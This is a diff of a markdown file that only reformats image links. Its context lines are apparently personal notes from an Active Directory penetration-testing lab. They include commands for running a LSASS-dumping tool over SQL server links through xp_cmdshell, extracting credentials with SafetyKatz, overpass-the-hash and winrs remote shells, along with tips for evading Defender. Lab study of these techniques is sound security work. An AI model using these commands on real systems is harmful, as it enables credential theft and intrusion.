@@ -17,7 +17,7 @@ LSASS dump using custom APIs
 - to get the PID of LSASS, you must use WINAPIs or it will get picked up
 	- if you have RDP access, you can use Task Manager or other unsuspicious tools
 - can use a code snippet like the following to get a PID
-![[assets/Pasted image 20260321041846.png]]
+![Pasted image 20260321041846](assets/Pasted%20image%2020260321041846.png)
 - using this code in an executable by itself will not trigger Defender AV or MDE
 
 
@@ -56,7 +56,7 @@ LSASS dump using custom APIs
 Create an SMB share and give everyone read write access
 - enable guest access
 - right click folder to share -> properties -> sharing -> share -> Everyone
-![[assets/Pasted image 20260321043059.png]]
+![Pasted image 20260321043059](assets/Pasted%20image%2020260321043059.png)
 - share contains FindLSASSPID and minidumpdotnet
 
 
@@ -66,7 +66,7 @@ Import PowerUpSQL
 
 share the file using the sql database links
 `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''\\dcorp-student1.dollarcorp.moneycorp.local\studentshare1\FindLSASSPID.exe''' -QueryTarget eu-sqli`
-![[assets/Pasted image 20260321043324.png]]
+![Pasted image 20260321043324](assets/Pasted%20image%2020260321043324.png)
 - won't download to machine, just runs it directly from the share
 
 
@@ -81,7 +81,7 @@ dump the memory of the LSASS process
 
 use SafetyKatz to extract credentials from the dump
 `C:\AD\Tools\safetykatz.exe "sekurlsa::minidump C:\AD\Tools\studentshare1\monkey1.dmp "sekurlsa::evasive-keys" "exit"`
-![[assets/Pasted image 20260321044035.png]]
+![Pasted image 20260321044035](assets/Pasted%20image%2020260321044035.png)
 
 
 overpass the hash with the credentials extracted
@@ -91,6 +91,6 @@ overpass the hash with the credentials extracted
 - if this one is blocked too, try winrs
 `winrs -r:eu-sql1.eu.eurocrop.local cmd`
 `set username`
-![[assets/Pasted image 20260321044456.png]]
+![Pasted image 20260321044456](assets/Pasted%20image%2020260321044456.png)
 - remember you don't need to privesc every machine, just get remote code execution
 
